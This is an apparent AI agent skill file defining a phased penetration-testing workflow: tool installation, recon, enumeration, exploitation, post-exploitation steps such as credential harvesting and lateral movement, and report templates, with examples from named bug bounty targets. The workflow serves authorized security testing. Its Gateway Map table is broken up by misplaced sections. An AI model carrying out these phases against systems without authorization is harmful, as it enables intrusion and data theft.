---
name: ptest
description: "Structured penetration testing framework with gated phases. Guides methodical progression from recon through exploitation to reporting."
version: 4.2.0
author: n4igme
license: MIT
argument-hint: "<command: start|preflight|status|resume|next|escalate|cleanup|recon-passive|recon-active|enumerate|attack-surface|vuln-assess|exploit|post-exploit|report>"
metadata:
  hermes:
    tags: [pentest, penetration-testing, security, recon, exploitation, post-exploitation, red-teaming, offensive-security]
    related_skills: [godmode, parse-finding, mtest, scode]
---

# Penetration Testing Framework

Structured pentest engagement with mandatory quality gates preventing premature phase advancement.

## Architecture

`Gateway (Quality Gate)` → `Phase (Pentest Stage)` → `Tasks (Techniques)`

## Commands

$ARGUMENTS
<!-- ↑ Runtime token: the skill framework substitutes this with the user's actual command argument -->

| Command | Action |
|---------|--------|
| `start` | Initialize a new engagement — prompt for scope, targets, and authorization |
| `preflight` | Check mandatory tool availability and install missing tools |
| `status` | Show current gateway state, progress, and pending techniques |
| `resume` | Resume an interrupted engagement — read existing output and continue from last checkpoint |
| `next` | Attempt to advance to the next phase (runs exit criteria check) |
| `escalate` | Trigger critical finding escalation |
| `cleanup` | Archive engagement output, sanitize sensitive data |
| `recon-passive` | Execute passive recon techniques |
| `recon-active` | Execute active recon techniques |
| `enumerate` | Execute application-layer enumeration |
| `attack-surface` | Map and confirm attack surface with user |
| `vuln-assess` | Execute threat modeling and vulnerability assessment |
| `exploit` | Execute exploitation techniques |
| `post-exploit` | Execute post-exploitation techniques |
| `report` | Generate final pentest report |

If no command is given, show current status and suggest next action.

---

## Preflight Check (`preflight`)

**Run this before starting any engagement.** Verifies all mandatory and recommended tools are available, and installs missing ones.

### Mandatory Tools (engagement cannot proceed without these)

| Tool | Phase | Install Command (macOS) | Install Command (Linux) |
|------|-------|------------------------|------------------------|
| `dig` | 1 | `brew install bind` | `apt install dnsutils` |
| `curl` | 1 | (pre-installed) | `apt install curl` |
| `whois` | 1 | (pre-installed) | `apt install whois` |
| `nmap` | 2 | `brew install nmap` | `apt install nmap` |
| `gobuster` | 3 | `brew install gobuster` | `go install github.com/OJ/gobuster/v3@latest` |
| `ffuf` | 3 | `brew install ffuf` | `go install github.com/ffuf/ffuf/v2@latest` |
| `nuclei` | 5 | `brew install nuclei` | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |

### Recommended Tools (enhance coverage but not blocking)

| Tool | Phase | Install Command (macOS) | Install Command (Linux) |
|------|-------|------------------------|------------------------|
| `subfinder` | 1 | `brew install subfinder` | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| `amass` | 1 | `brew install amass` | `go install github.com/owasp-amass/amass/v4/...@master` |
| `theHarvester` | 1 | `pip3 install theHarvester` | `pip3 install theHarvester` |
| `spiderfoot` | 1 | `pip3 install spiderfoot` | `pip3 install spiderfoot` |
| `photon` | 1 | `pip3 install photon` | `pip3 install photon` |
| `gitleaks` | 1 | `brew install gitleaks` | `go install github.com/gitleaks/gitleaks/v8@latest` |
| `trufflehog` | 1 | `brew install trufflehog` | `go install github.com/trufflesecurity/trufflehog/v3@latest` |
| `dnsx` | 2 | `go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest` | `go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| `puredns` | 2 | `go install github.com/d3mondev/puredns/v2@latest` | `go install github.com/d3mondev/puredns/v2@latest` |
| `massdns` | 2 | `brew install massdns` | `apt install massdns` |
| `dnsrecon` | 2 | `pip3 install dnsrecon` | `pip3 install dnsrecon` |
| `dnsenum` | 2 | `brew install dnsenum` | `apt install dnsenum` |
| `masscan` | 2 | `brew install masscan` | `apt install masscan` |
| `feroxbuster` | 3 | `brew install feroxbuster` | `apt install feroxbuster` |
| `arjun` | 3 | `pip3 install arjun` | `pip3 install arjun` |
| `kiterunner` | 3 | `go install github.com/assetnote/kiterunner/cmd/kr@latest` | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
| `linkfinder` | 3 | `pip3 install linkfinder` | `pip3 install linkfinder` |
| `wpscan` | 3 | `brew install wpscan` | `gem install wpscan` |
| `nikto` | 5 | `brew install nikto` | `apt install nikto` |
| `testssl.sh` | 5 | `brew install testssl` (binary: `testssl.sh`) | `git clone https://github.com/drwetter/testssl.sh.git` |
| `sslscan` | 5 | `brew install sslscan` | `apt install sslscan` |
| `searchsploit` | 5 | `brew install exploitdb` | `apt install exploitdb` |
| `sqlmap` | 6 | `brew install sqlmap` | `apt install sqlmap` |
| `hydra` | 6 | `brew install hydra` | `apt install hydra` |

### Wordlists

**Platform-aware path resolution:** Detect the SecLists path at preflight and store it for the engagement.

```bash
# Resolve SECLISTS_PATH based on platform
if [ -d "/usr/share/seclists" ]; then
  SECLISTS_PATH="/usr/share/seclists"
elif [ -d "/opt/homebrew/share/seclists" ]; then
  SECLISTS_PATH="/opt/homebrew/share/seclists"
elif [ -d "/usr/local/share/seclists" ]; then
  SECLISTS_PATH="/usr/local/share/seclists"
elif [ -d "$HOME/SecLists" ]; then
  SECLISTS_PATH="$HOME/SecLists"
else
  SECLISTS_PATH=""  # Not found — prompt user
fi
```

Store the resolved path in `state.yaml` under `config.seclists_path`. All subsequent commands use `$SECLISTS_PATH` instead of hardcoded paths.

The following wordlists are expected (from SecLists):
- `$SECLISTS_PATH/Discovery/Web-Content/raft-medium-directories.txt`
- `$SECLISTS_PATH/Discovery/Web-Content/raft-medium-files.txt`
- `$SECLISTS_PATH/Discovery/Web-Content/api/api-endpoints.txt`
- `$SECLISTS_PATH/Discovery/DNS/subdomains-top1million-5000.txt`

Install SecLists if missing:
```bash
# macOS
brew install seclists

# Linux / manual
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
```

### Preflight Procedure

1. **Detect platform** (macOS/Linux).
2. **Check mandatory tools** — for each, verify `which <tool>` succeeds.
3. **Report status** — show table of available/missing tools.
4. **Install missing mandatory tools** — prompt user for confirmation, then install.
5. **Check recommended tools** — report which are available, offer to install missing ones.
6. **Check wordlists** — verify SecLists path exists.
7. **Update nuclei templates** — run `nuclei -update-templates` if nuclei is installed.
8. **Write preflight report** — save to `./ptest-output/preflight.md`.

If any mandatory tool cannot be installed, the engagement can still proceed but the gap must be documented in the phase checklist.

### Operational Pitfalls (from real engagements)

> **Full reference:** See `references/operational-pitfalls.md` for 50+ battle-tested pitfalls covering tool performance, cloud infrastructure quirks, and Hermes Agent execution patterns. Load when encountering unexpected behavior.

---

## Multi-Target Engagement Structure

When a bug bounty program has multiple in-scope assets (e.g., 14 targets under GoTo Financial), organize the output directory per-target under the program directory:

```
./ptest-output/                    # Primary target (first tested)
  state.yaml
  scope.md                         # FULL program scope (all assets)
  findings-log.md                  # Findings for primary target
  ...
./target2.domain/
  ptest-output/
    state.yaml                     # Independent state per target
    scope.md                       # Target-specific scope subset
    findings-log.md                # Findings for this target
    ...
./target3.domain/
  ptest-output/
    ...
```

**Rules:**
1. The primary `scope.md` documents ALL program assets and their status (tested/dead/RBAC-blocked/pending)
2. Each target gets its own `state.yaml` with independent phase tracking
3. Finding IDs are unique per-target (F-1 in target A ≠ F-1 in target B)
4. When submitting to the platform, reference findings by `{target}:{finding-id}` (e.g., `findaya.co.id:F-4`)
5. Cross-target findings (e.g., shared Faro API key across gopayapi.com and findaya.co.id) go in the target where they have highest impact
6. Mark targets as they're completed: `tested (N findings)`, `dead (decommissioned)`, `RBAC-blocked`, `hardened (0 findings)`

**Fast-exit heuristics for multi-target programs:**
- If a target returns identical Istio RBAC 403 on all paths → mark as "RBAC-blocked", move on (5 min max)
- If all subdomains don't resolve → mark as "dead/decommissioned", move on (2 min max)
- If a target is a well-known hardened service (e.g., Midtrans payment API) and all endpoints return proper 401 → mark as "hardened", move on (10 min max)
- Prioritize targets that share infrastructure with already-vulnerable targets (e.g., findaya.com shares IPs with findaya.co.id)

---

## Initialization (`start`)

Before any testing begins, collect and document:

1. **Preflight Check** — automatically run `preflight` to verify tool availability. Install missing mandatory tools before proceeding.
2. **Target Scope** — domains, IPs, applications, exclusions
3. **Scope Type** — determines which techniques apply:
   - `web` — web applications, APIs
   - `network` — infrastructure, hosts, services
   - `cloud` — AWS/GCP/Azure resources
   - `mobile` — iOS/Android applications
   - `mixed` — combination (default)
4. **Rules of Engagement** — testing hours, restricted techniques, notification requirements
5. **Authorization** — confirm written authorization exists (do NOT proceed without it)
6. **Output Directory** — create `./ptest-output/` with subdirectories:

```
./ptest-output/
  state.yaml            # Gateway state tracker
  scope.md              # Scope, type, and authorization record
  findings-log.md       # Running log of all findings
  recon-passive/        # Phase 1 results
    checklist.md
  recon-active/         # Phase 2 results
    checklist.md
  enumeration/          # Phase 3 results
    checklist.md
  attack-surface/       # Phase 4 results
    checklist.md
  vuln-assessment/      # Phase 5 results
    checklist.md
  exploit/              # Phase 6 results
    checklist.md
  post-exploit/         # Phase 7 results
    checklist.md
  report/               # Phase 8 — Final report
  escalations/          # Critical finding escalations
```

Write initial `state.yaml`:

```yaml
engagement:
  name: ""
  started: ""
  scope_type: ""

config:
  seclists_path: ""  # Resolved during preflight

gateways:
  1_passive_recon: OPEN
  2_active_recon: LOCKED
  3_enumeration: LOCKED
  4_attack_surface: LOCKED
  5_vuln_assessment: LOCKED
  6_exploitation: LOCKED
  7_post_exploitation: LOCKED
  8_reporting: LOCKED

time_tracking:
  phase_1_start: ""
  phase_1_end: ""
  phase_2_start: ""
  phase_2_end: ""
  phase_3_start: ""
  phase_3_end: ""
  phase_4_start: ""
  phase_4_end: ""
  phase_5_start: ""
  phase_5_end: ""
  phase_6_start: ""
  phase_6_end: ""
  phase_7_start: ""
  phase_7_end: ""
  phase_8_start: ""
  phase_8_end: ""
  total_duration: ""  # Calculated at cleanup

findings_count: 0
escalations_count: 0
```

**Time tracking:** Record ISO timestamps when each phase starts and ends. At cleanup, calculate total duration and per-phase time. This enables:
- Accurate billing/reporting of engagement hours
- Identifying which phases took longer than expected (vs effort allocation guidelines)
- Improving time estimates for future engagements

### Scope-Aware Checklist Generation

When generating phase checklists during `start`, filter techniques by scope type. Techniques that don't apply to the engagement's scope type should be pre-marked as `N/A (scope: {type})` instead of `PENDING`.

| Phase | Technique | web | network | cloud | mobile | mixed |
|-------|-----------|-----|---------|-------|--------|-------|
| 1 | OSINT Gathering | Y | Y | Y | Y | Y |
| 1 | JS Bundle Analysis & Staging Domain Discovery | Y | N | Y | Y | Y |
| 1 | Subdomain Enumeration | Y | Y | Y | N | Y |
| 1 | Internal Asset Inventory Request | Y | Y | Y | N | Y |
| 1 | Knowledge Base / Support Site Scraping | Y | Y | Y | N | Y |
| 1 | Pattern-Based Subdomain Brute-Force | Y | Y | Y | N | Y |
| 1 | Technology Fingerprinting | Y | N | Y | Y | Y |
| 1 | Email & Username Discovery | Y | Y | Y | N | Y |
| 1 | Network Mapping | N | Y | Y | N | Y |
| 1 | Asset Validation | Y | Y | Y | N | Y |
| 2 | Port Scanning (MANDATORY) | Y | Y | Y | Y | Y |
| 2 | Active DNS Expansion — Pattern Permutation (MANDATORY) | Y | Y | Y | N | Y |
| 2 | Active DNS Expansion — DNS-Level Brute-Force dnsx/puredns (MANDATORY) | Y | Y | Y | N | Y |
| 2 | Active DNS Expansion — Reverse DNS on IP Ranges | N | Y | Y | N | Y |
| 2 | Active DNS Expansion — Virtual Host Enumeration | Y | N | Y | N | Y |
| 2 | Active DNS Expansion — Zone Transfer Attempt | Y | Y | Y | N | Y |
| 2 | Service Detection & Banner Grabbing | Y | Y | Y | Y | Y |
| 2 | OS Fingerprinting | N | Y | N | N | Y |
| 2 | Network Topology Mapping | N | Y | Y | N | Y |
| 3 | Directory & File Brute-Force (MANDATORY) | Y | N | N | N | Y |
| 3 | HTTP Method Testing on Unauth Endpoints (MANDATORY) | Y | N | Y | N | Y |
| 3 | API Endpoint Discovery (MANDATORY) | Y | N | Y | Y | Y |
| 3 | Parameter Discovery | Y | N | N | Y | Y |
| 3 | Virtual Host Enumeration | Y | N | N | N | Y |
| 3 | CMS-Specific Enumeration | Y | N | N | N | Y |
| 3 | JavaScript Analysis | Y | N | N | Y | Y |
| 3 | JavaScript Secret Scanning (MANDATORY) | Y | N | N | Y | Y |
| 3 | Source Map Sweep (MANDATORY when web apps found) | Y | N | N | N | Y |
| 3 | Authentication Endpoint Mapping | Y | N | Y | Y | Y |
| 3 | Bulk Actuator/Admin Scan (MANDATORY) | Y | N | Y | N | Y |
| 5 | Threat Modeling | Y | Y | Y | Y | Y |
| 5 | Nuclei Scan (MANDATORY) | Y | N | Y | N | Y |
| 5 | CORS Origin Reflection Testing (MANDATORY) | Y | N | Y | N | Y |
| 5 | OAuth/OIDC redirect_uri Validation (MANDATORY) | Y | N | Y | N | Y |
| 5 | Nikto Scan | Y | N | N | N | Y |
| 5 | SSL/TLS Assessment | Y | Y | Y | N | Y |
| 5 | CVE Mapping | Y | Y | Y | Y | Y |
| 5 | Manual Verification | Y | Y | Y | Y | Y |
| 5 | Prioritized Vector List | Y | Y | Y | Y | Y |
| 6 | Known CVE Exploitation | Y | Y | Y | Y | Y |
| 6 | Web Application Attacks | Y | N | Y | N | Y |
| 6 | Authentication Bypass | Y | Y | Y | Y | Y |
| 6 | Injection Attacks | Y | N | Y | Y | Y |
| 6 | Logic Flaws | Y | N | Y | Y | Y |
| 6 | Client-Side Attacks | Y | N | N | Y | Y |
| 7 | Privilege Escalation | Y | Y | Y | Y | Y |
| 7 | Lateral Movement | N | Y | Y | N | Y |
| 7 | Persistence (Document Only) | N | Y | Y | N | Y |
| 7 | Data Access | Y | Y | Y | Y | Y |
| 7 | Credential Harvesting | Y | Y | Y | Y | Y |

When scope type is `mixed`, all techniques are `PENDING`. For other scope types, mark `N` entries as `N/A (scope: {type})`.

---

## Resume (`resume`)

When resuming an interrupted engagement:

1. Read `./ptest-output/state.yaml` to determine active gateway.
2. Read the active phase's `checklist.md` to see which techniques are done vs. pending.
3. Read `./ptest-output/findings-log.md` for context on what's been found.
4. Report status to user and suggest next technique to execute.

### Recovery (if state.yaml is missing or corrupted)

If `state.yaml` cannot be read:
1. Scan `./ptest-output/*/checklist.md` files to determine which phases have been started.
2. Find the last phase with a checklist containing `DONE` or `FAILED` entries.
3. Count findings in `./ptest-output/findings-log.md` to reconstruct `findings_count`.
4. Count files in `./ptest-output/escalations/` to reconstruct `escalations_count`.
5. Rebuild `state.yaml` — mark completed phases as `PASSED`, current phase as `OPEN`, remaining as `LOCKED`.
6. Inform user of reconstructed state and ask for confirmation before proceeding.

---

## Gateway Map

| Gateway | Phase | Skill File | Exit Criteria |
|---------|-------|-----------|---------------|
| 1 | Passive Reconnaissance | `recon-passive.md` | Attack surface mapped, subdomains validated, technologies identified. OSINT completeness verified per `references/osint-completeness-checklist.md`. **Env-prefix quick-win check completed** (see below). |
| 2 | Active Reconnaissance | `recon-active.md` | Subdomain list expanded via active DNS techniques (including env-prefix mutation on ALL discovered subdomains), all hosts port-scanned, services detected, network topology mapped |
| 3 | Enumeration | `enumeration.md` | Applications enumerated, APIs mapped, parameters discovered, Prometheus metrics mined for hidden services |
| 4 | Attack Surface Mapping | `attack-surface.md` | Asset inventory confirmed with user, scope finalized, entry points mapped |

### Phase 4: Dismissal Rules

### Env-Prefix Quick-Win Check (END of Phase 1, MANDATORY)

Before transitioning to Phase 2, scan ALL discovered subdomains for environment indicators and immediately generate prod equivalents. This is a 5-minute check that catches forgotten production assets.

**Process:**
1. Grep your merged subdomain list for env patterns: `grep -iE '\.(dev|staging|stg|sit|uat|mock|sandbox|test|qa|preprod|nonprod|demo|lab)\.' subdomains-merged.txt`
2. For EACH match, generate the bare-domain equivalent (strip the env segment)
3. Resolve the bare-domain equivalents with `dig +short`
4. If any resolve — add to master list, flag as **HIGH PRIORITY** targets (forgotten prod assets)

**Example (BFI, May 2026):**
```
Found in passive recon:  e-pmo2.dev.bfi.co.id → 172.22.32.94
Quick-win derivation:    e-pmo2.bfi.co.id     → 34.111.225.150 ← LIVE PROD!
Result:                  Forgotten PHP app with SQLi → 21 databases compromised
```

**Why at end of Phase 1 (not Phase 2):** Phase 2 does full permutation brute-force which takes time. This quick-win check takes seconds and catches the most common blind spot — a dev subdomain in CT logs whose production equivalent has no certificate (uses wildcard) and was never publicly indexed. Don't wait for Phase 2 to find these.

**Exit gate addition:** Document in Phase 1 output: "Env-prefix quick-win: X subdomains with env indicators found, Y bare-domain equivalents tested, Z new live hosts discovered."

---

### Phase 4: Dismissal Rules

**Before dismissing ANY subdomain group, verify:**

1. ✅ Tested `/actuator` on at least 5 hosts in the group
2. ✅ Tested `/swagger-ui.html`, `/api-docs` on at least 3 hosts
3. ✅ Tested `/admin`, `/console`, `/login` on at least 3 hosts
4. ✅ Documented what was tested in the dismissal entry
5. ✅ Added caveat if full coverage wasn't achieved

**Dismissal format:**
```markdown
| # | Pattern | Reason | Verified Paths | Caveat |
|---|---------|--------|---------------|--------|
| 1 | *.mock.domain.com | API returns 401, shared IP | /actuator (5 hosts), /admin (3 hosts) | None — all checked |
```

**NEVER write:** `"all behind Basic Auth"` without testing actuator/admin paths specifically. Application auth and framework endpoint auth are independent.

### Phase 4: Attack Surface Prioritization Matrix

When mapping the attack surface, score each asset to determine exploitation priority:

| Factor | Score 3 (High) | Score 2 (Medium) | Score 1 (Low) |
|--------|---------------|-----------------|--------------|
| Auth Status | No auth required | Weak auth (Basic, default creds likely) | Strong auth (JWT, MFA, IAP) |
| Data Sensitivity | PII, credentials, financial data | Business logic, configs | Public/reference data |
| Exposure Level | Internet-facing, no WAF | Internet-facing, behind WAF/CDN | Internal IP only |
| Attack Surface Size | Multiple endpoints, accepts input | Few endpoints, limited input | Single static endpoint |
| Environment | Production | UAT/Staging | Dev/Mock |

**Priority = Sum of scores (max 15)**
- 12-15: Critical target — exploit first
- 8-11: High target — exploit if time permits
- 5-7: Medium target — quick checks only
- 3-4: Low target — skip unless nothing else works

This prevents wasting time on hardened low-value targets while missing easy wins on high-value ones.
| 5 | Threat Modeling & Vuln Assessment | `vuln-assessment.md` | Attack trees documented, vuln scans complete, CORS reflection tested on all auth endpoints, vectors prioritized |
| 6 | Exploitation | `exploit.md` | All mandatory techniques executed, credential inventory validated, top 5 vectors attempted, attack chains documented (see `references/phase6-exploitation-framework.md`). **Local verification passed** (see below). |
| 7 | Post-Exploitation | `post-exploit.md` | Access type classified, appropriate playbook completed, data scope documented, attack path diagram created, credentials added to inventory (see `references/phase7-post-exploitation-framework.md`) |
| 8 | Reporting | `report.md` | Final report delivered, pre-delivery checklist passed (see `references/phase8-reporting-process.md`) |

### Local Exploit Verification Gate (Phase 6 → 7 transition, MANDATORY)

Before advancing from Phase 6, every confirmed exploit MUST be locally verified when possible. This prevents submitting broken exploits (wrong payload format, missing interface requirements, incorrect assumptions about server behavior).

**Verification procedure:**
1. **Re-read the actual source/target behavior** — don't rely on notes from earlier analysis. Re-fetch/re-read the code.
2. **Simulate the environment locally** — install the same libraries (yauzl, express, spring-boot, etc.), replicate the file structure, run the exploit against your local simulation.
3. **Verify each chain link independently** — test validation bypass, test payload delivery, test execution separately before combining.
4. **Compare your assumptions vs actual code** — check function signatures, required interfaces, return value handling, error paths.
5. **Document verification result** — add "Locally verified: YES/NO (reason)" to the finding.

**When local verification is NOT possible:**
- Target uses proprietary/closed-source backend (no source available)
- Environment requires specific cloud services that can't be replicated
- Exploit depends on race conditions or timing that can't be simulated

In these cases, document: "Local verification not possible: {reason}. Confidence level: HIGH/MEDIUM/LOW based on {evidence}."

**Real-world save (Dojo #51, May 2026):** Initial exploit had wrong plugin interface (`module.exports = { result: flag }` instead of required `get()`, `getName()`, `run()` methods). Also had wrong first-nibble constraint (`0xA || 0xB` instead of actual `0xA || 0xC`). Local simulation caught both before submission.

---

## Effort Allocation

**Time-box enforcement:** See `references/time-box-enforcement.md` for:
- Budget calculation and tracking in state.yaml
- Alert levels (on-track / warning / over-budget / critical)
- Over-budget decision tree with borrowing rules
- Per-technique time caps and move-on heuristics
- End-of-engagement triage procedure
- Scope adjustment triggers

For time-boxed engagements, use these guidelines to avoid over-investing in early phases:

| Phase | % of Total Time | Rationale |
|-------|----------------|-----------|
| 1–2 Recon (Passive + Active) | 15% | Discovery, not exploitation |
| 3 Enumeration | 15% | Deep enough to find entry points |
| 4 Attack Surface | 5% | Planning — consolidation only |
| 5 Vuln Assessment | 20% | Scanning + manual verification |
| 6 Exploitation | 25% | Highest-value work |
| 7 Post-Exploitation | 10% | Demonstrate impact |
| 8 Reporting | 10% | Write-up (findings documented throughout) |

Adjust based on scope size. Large scope (50+ hosts) → more recon time. Small scope (single app) → more exploitation time.

**Continuous/internal engagements:** When the operator is a full-time internal pentester (no time-box), set `time_budget.mode: "continuous"` in state.yaml. Track time spent for reporting purposes only — no budget enforcement. The effort allocation percentages still guide sequencing priority but don't trigger over-budget alerts.

**Move-on heuristic:** If a technique yields no new results after 15–20 minutes of active work, mark it `DONE` (no findings) or `FAILED (diminishing returns)` and proceed to the next technique.

**Early-finding fast-track (bug bounty):** When a confirmed High/Critical finding is discovered during Phase 1-3 (before full enumeration), the operator may choose to fast-track: (1) document the finding fully, (2) complete the current phase's mandatory checks, (3) skip remaining low-priority techniques in later phases, (4) proceed directly to reporting. This is appropriate when: the finding is clearly reportable, the remaining attack surface is hardened/RBAC-blocked, and spending more time won't improve the finding's severity. Mark skipped phases as "PASSED (fast-tracked — confirmed High finding)" in state.yaml. Continue probing other live hosts briefly (10-15 min) to check for additional quick wins before closing.

**Continuous engagement override:** For internal/continuous engagements (`time_budget.mode: "continuous"`), the 15-20 min heuristic is a GUIDELINE, not a hard rule. Vectors that show partial progress (e.g., JWT algorithm identified but secret not yet cracked, heapdump downloaded but not fully analyzed with MAT) deserve extended time. Use judgment: if the technique is producing incremental intelligence (even without a confirmed finding), continue. The heuristic exists to prevent spinning on dead-end vectors, not to cut short promising leads.

---

## Mandatory Tools

Each phase has mandatory tools that MUST be executed (unless unavailable — document why if skipped).

| Phase | Mandatory | Recommended |
|-------|-----------|-------------|
| 1 — Passive Recon | dig, curl, whois | subfinder, amass, theHarvester |
| 2 — Active Recon | nmap | masscan |
| 3 — Enumeration | gobuster/feroxbuster, ffuf | arjun, linkfinder, wpscan |
| 4 — Attack Surface | (planning phase — no tools) | — |
| 5 — Vuln Assessment | nuclei | nikto, testssl.sh, sslscan |
| 6 — Exploitation | (depends on vector) | sqlmap, burp, metasploit |
| 7 — Post-Exploitation | (depends on access) | linpeas, winpeas, crackmapexec |
| 8 — Reporting | (writing phase — no tools) | — |

If a mandatory tool is unavailable, document the gap and use the best available alternative. Never silently skip a mandatory tool.

---

## Finding Template

Every finding documented during the engagement MUST follow this format:

### Finding ID Assignment

IDs are auto-incremented from `state.yaml`:
1. Read current `findings_count` from `./ptest-output/state.yaml`.
2. Increment by 1.
3. Use the new value as the finding ID (e.g., `FINDING-1`, `FINDING-2`, ...).
4. Write the updated `findings_count` back to `state.yaml` immediately.

This ensures unique, sequential IDs even across phases and sessions.

```markdown
## [FINDING-{ID}] {Title}

**Severity:** Critical / High / Medium / Low / Info
**CVSS 3.1:** {score} ({vector string})
**Affected Asset:** {host, endpoint, or component}
**Environment:** prod / nonprod / experiment / all
**Phase Discovered:** {phase number and name}
**Verification Status:** Confirmed / Unverified

### Description
{What the vulnerability is and why it matters}

### Steps to Reproduce
1. {step}
2. {step}
3. {step}

### Evidence
{Screenshots, request/response logs, command output — MUST include direct proof}

### Impact
{What an attacker can achieve}

### Remediation
{Required fix and defense-in-depth recommendations}
```

**Verification Status rules:**
- **Confirmed** — you have direct evidence proving the issue exists right now (HTTP response, command output, screenshot). Only confirmed findings go into the final report.
- **Unverified** — you suspect the issue exists based on indirect evidence (DNS record, CT log, version number) but have not proven it. Unverified items go into a "Potential Issues" appendix and are passed to the next phase for validation. They do NOT count toward `findings_count` in state.yaml.

Individual findings can be formatted for Jira export using `/parse-finding`.

---

## Operational Lifecycle

### Execution Loop

1. **Read State** — check `./ptest-output/state.yaml` to determine active gateway.
2. **Read Checklist** — check the phase's `checklist.md` for pending techniques.
3. **Pick Technique** — select next pending technique.
4. **Execute** — run the technique using the tools specified in the phase skill file.
5. **Document** — record findings using the Finding Template above.
6. **Update Checklist** — mark technique status in `checklist.md`:
   - `DONE` — technique executed successfully (findings or no findings)
   - `SKIPPED (reason)` — technique not applicable or tool unavailable
   - `FAILED (reason)` — technique attempted but did not succeed (e.g., WAF blocked, tool crashed, target unresponsive)
7. **Update Findings Log** — append to `./ptest-output/findings-log.md`.
8. **Repeat** until phase exit criteria are met.

### Gateway Transition (`next`)

1. **Coverage Audit** — verify checklist shows sufficient technique coverage.
2. **Mandatory Tool Check** — confirm all mandatory tools for the phase were executed.
3. **Evidence Check** — confirm all findings have supporting evidence.
4. **Exit Criteria** — evaluate against the phase's exit criteria (see Gateway Map).
5. **Sign-off** — ask user: *"Phase [X] complete. [N] findings documented. Ready to advance to [next phase]?"*
6. **Update State** — update `./ptest-output/state.yaml`: mark gateway as PASSED, unlock next.

---

## Escalation Protocol

Triggered by `escalate` command OR automatically when a Critical/P1 finding is discovered.

**ID relationship:** An escalation is also a finding. It gets both:
- A **finding ID** from `findings_count` (e.g., `FINDING-5`) — used in findings-log.md and the final report.
- An **escalation ID** from `escalations_count` (e.g., `escalation-1`) — used for the escalation file name and urgent notification.

The escalation file references the finding ID for traceability.

1. Document finding fully using the Finding Template (assigns a finding ID).
2. Classify severity (CVSS 3.1).
3. Write to `./ptest-output/escalations/escalation-{escalations_count}.md`, referencing `FINDING-{ID}`.
4. Alert user for immediate client communication.
5. Current gateway pauses until escalation is acknowledged.
6. Increment `escalations_count` in `state.yaml`.

See `escalate-finding.md` for full procedure.

---

## Cleanup (`cleanup`)

Post-engagement housekeeping:

1. **Archive** — compress `./ptest-output/` to `./ptest-output-{engagement-name}-{date}.tar.gz`.
2. **Sanitize** — remove credentials *you used* during testing (your API keys, auth tokens, test account passwords). Do NOT remove credentials *you found* as findings — those are evidence and must remain in the report.
3. **Verify** — confirm report is complete and all findings are documented.
4. **Summary** — print engagement stats (findings by severity, phases completed, duration).

---

## Report Structure Template (`report`)

**Full reporting process:** See `references/phase8-reporting-process.md` for:
- Writing process (6 steps with time allocation)
- Audience-aware writing (CISO vs engineer vs executive vs compliance)
- Remediation prioritization matrix and tier structure
- Executive summary writing guide with anti-patterns
- Pre-delivery checklist (accuracy, completeness, sensitivity, formatting)
- Client debrief meeting structure
- Handling client pushback on findings
- Report quality indicators

**Bug bounty submissions:** See `references/bug-bounty-submission-guide.md` for:
- Platform-specific formatting (YesWeHack, HackerOne, Bugcrowd)
- Disclosure policy rules (NEVER publish PoCs before vendor fix)
- Scope boundary decisions (related domains, same company)
- Multi-finding consolidation strategy (when to combine vs separate)
- Submission ordering (strongest first)
- Severity justification and triage pushback responses

**Attack chain narratives:** See `references/attack-chain-narrative-writing.md` for:
- Root cause diagram template (ASCII flow)
- Step-by-step enablement table
- Comparison table (individual vs combined severity)
- Systemic pattern identification
- "Critical enabler" explanation pattern
- Severity upgrade justification

**Multi-operator coordination:** See `references/multi-operator-coordination.md` for:
- Role definitions (Lead / Operator / Reviewer)
- Work splitting strategies (phase-based, target-based, technique-based, hybrid)
- Shared state management and directory structure
- Finding ID coordination (pre-allocated ranges)
- Credential inventory coordination and handoff protocol
- Communication protocol and sync points
- Conflict resolution (duplicates, overlap, severity disagreements)
- Report assembly process for multi-person teams

**Bug bounty submission template:** See `templates/yeswehack-chain-submission.md` for the proven format for submitting chained/combined findings to YesWeHack (also applicable to HackerOne/Bugcrowd with minor adjustments). Key principles: combine related findings into chains for higher severity, submit strongest-scope finding first, include copy-pasteable curl commands with actual responses.

The final report should follow this structure. Adapt sections based on engagement scope and findings.

```markdown
# Penetration Test Report — {Client Name} ({target domain})

## 1. Executive Summary
- Severity breakdown table (Critical/High/Medium/Low/Info)
- Top critical risk (1-2 sentences)
- Security posture: Strengths + Weaknesses
- Immediate actions required (top 3)

## 2. Scope & Methodology
- Scope table (target, type, exclusions, restrictions, authorization)
- 8-phase methodology list with ✅ status
- Tools used table

## 3. Attack Surface Overview
- Infrastructure stats (subdomains, live hosts, IPs, cloud provider)
- Environment exposure matrix (which envs are public vs should be internal)

## 4. Findings Summary
- Table: ID | Title | Severity | CVSS | Asset

## 5. Detailed Findings
- Each finding using the Finding Template (see above)
- Ordered by severity (Critical → Low)

## 6. Attack Narrative
- Story-form description of the engagement progression
- Key decision points and breakthroughs

## 7. Remediation Roadmap
- Immediate (1 week) — critical/high findings
- Short-term (1 month) — medium findings
- Medium-term (3 months) — architectural improvements

## 8. Infrastructure Architecture (if discovered)
- K8s/cloud topology
- Service mesh details
- Microservice inventory
- Network segmentation
- Supporting infrastructure

## 9. Advanced Testing Results (if performed)
- SSRF testing summary
- Other specialized testing (e.g., API fuzzing, auth bypass campaigns)

## 10. Risk Matrix & Business Impact
- Industry-specific context (financial, healthcare, etc.)
- Regulatory implications
- Worst-case attack chain scenario

## 11. Appendices
- Links to supporting evidence files

## 12. Conclusion
- Split posture assessment
- Overall risk rating
- Final recommendation
```

### Reassessment/Redo Report Adaptations

When the engagement is a reassessment (redo) of previously reported findings, adapt the report structure:

**Additional/modified sections:**

```markdown
## 0. Fix Verification Summary (INSERT BEFORE Executive Summary)

### Remediation Effectiveness

| Metric | Value |
|--------|-------|
| Round 1 findings | {n} |
| Fully fixed | {n} ({%}) |
| Partially fixed | {n} ({%}) |
| Unfixed | {n} ({%}) |
| **Remediation effectiveness** | **{%}** |
| Time since Round 1 report | {days/weeks} |

### Fix Verification Matrix

| R1 ID | Title | Severity | Gateway/Path Tested | Status | Notes |
|-------|-------|----------|--------------------:|--------|-------|
| F-1 | {title} | Critical | microservices.prod.bfi.co.id | ✅ Fixed | Returns 401 |
